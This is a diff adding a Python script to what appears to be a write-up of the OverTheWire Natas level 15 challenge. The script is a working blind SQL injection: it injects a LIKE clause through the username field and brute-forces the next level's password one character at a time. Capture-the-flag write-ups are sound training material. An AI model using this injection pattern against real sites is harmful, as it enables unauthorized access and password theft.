@@ -79,6 +79,34 @@ This user exists.
 So basically we need to *bruteforce* our way into `natas16`.  
 Hint: so far the passwords had a length of 32 chars.
 
+```python
+#!/usr/bin/env python
+
+import string
+import requests
+
+url = 'http://natas15.natas.labs.overthewire.org/'
+http_user = 'natas15'
+http_pass = ''
+
+bf_passwd = ""
+bf_dict = string.ascii_letters + string.digits
+
+while len(bf_passwd) != 32:
+    for char in bf_dict:
+        r = requests.get(url,
+                         params={
+                             'username': 'natas16" AND password LIKE "{}%'.format(bf_passwd + char)
+                         },
+                         auth=(http_user, http_pass))
+        if "This user exists." in r.text:
+            bf_passwd += char
+            if len(bf_passwd) == 32:
+                break
+
+print "Password: {}".format(bf_passwd)
+```
+
 
 * php
 * mysql_connect
